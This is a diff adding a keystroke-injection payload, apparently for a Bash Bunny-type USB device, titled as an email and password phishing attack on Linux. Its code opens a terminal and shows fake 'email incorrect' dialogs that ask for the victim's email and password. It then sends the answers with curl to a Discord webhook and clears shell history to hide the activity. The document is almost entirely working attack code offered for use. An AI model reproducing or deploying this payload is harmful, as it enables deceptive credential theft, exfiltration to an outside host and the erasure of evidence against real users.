@@ -1,0 +1,34 @@
+###########################################################
+#                                                         #
+# Title        : Exfiltrate Email And Password By Phising #
+# Author       : Aleff                                    #
+# Version      : 1.0                                      #
+# Category     : Phishing                                 #
+# Target       : Linux                                    #
+#                                                         #
+###########################################################
+
+ATTACKMODE HID
+
+# REQUIREMENTS
+#  - Internet Connection
+#  - Discord webhook
+
+# VARIABLES
+# - Provide Discord Webhook
+DISCORD_WEBHOOK='https://discordapp.com/api/webhooks/<webhook_id>/<token>'
+
+# CONST (change is not needed)
+MESSAGE='Email incorrect.\n Will not connect to server, please retry.'
+TITLE='Email \n Put your email address to connect yout account.'
+BOX='Email:'
+TITLE2='Email Login'
+PASSWORD='Email Password:'
+
+QUACK DELAY 1500
+QUACK CTRL-ALT t
+QUACK DELAY 2000
+
+# All-in-one is needed
+QUACK STRING \$(curl -H \"Content-Type: application/json\" -X POST -d \"{'content': '\$(echo \$(kdialog --sorry $MESSAGE; kdialog --title $TITLE --inputbox $BOX; kdialog --title $TITLE2 --password $PASSWORD;))'}\" $DISCORD_WEBHOOK); history -c; exit;
+QUACK ENTER
